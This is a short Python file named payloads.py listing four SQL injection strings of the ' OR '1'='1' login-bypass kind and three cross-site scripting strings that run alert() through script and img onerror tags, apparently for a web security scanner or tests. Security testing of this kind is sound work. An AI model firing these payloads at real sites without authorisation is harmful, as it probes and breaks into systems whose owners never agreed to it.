# payloads.py

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR 1=1--",
    "' OR '1'='1' /*",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "'><script>alert('XSS')</script>",
]

